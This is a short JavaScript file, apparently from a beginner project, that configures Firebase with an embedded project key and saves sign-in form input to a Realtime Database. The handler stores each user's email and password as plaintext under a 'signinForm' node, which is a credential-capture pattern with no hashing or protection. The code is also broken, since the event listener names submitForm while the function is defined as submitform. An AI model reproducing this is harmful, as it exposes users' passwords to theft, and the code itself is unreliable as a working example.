const firebaseConfig = {
  apiKey: "AIzaSyBIH-pNkb6yXYkhOpmvtxrX3FGEgnxkRiQ",
  authDomain: "sign-in-form-3925c.firebaseapp.com",
  databaseURL: "https://sign-in-form-3925c-default-rtdb.firebaseio.com",
  projectId: "sign-in-form-3925c",
  storageBucket: "sign-in-form-3925c.appspot.com",
  messagingSenderId: "205208796614",
  appId: "1:205208796614:web:dd0c232688b907af5286c7",
  measurementId: "G-1KMSYSXF62"
};


//initialize firebase
firebase.initializeApp(firebaseConfig);

//reference your database
var signinFormDB = firebase.database().ref('signinForm')

document.getElementById("signIn-form").addEventListener("submit", submitForm);

function submitform(e) {
  e.preventDefault();

  var email = getElementVal('sign-in-email');
  var password = getElementVal('sign-in-password');


  saveMessages(email, password);
}


const saveMessages = (email, password) => {
  var newSigninForm = signinFormDB.push();

  newSigninForm.set({
    email: email,
    password: password,
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};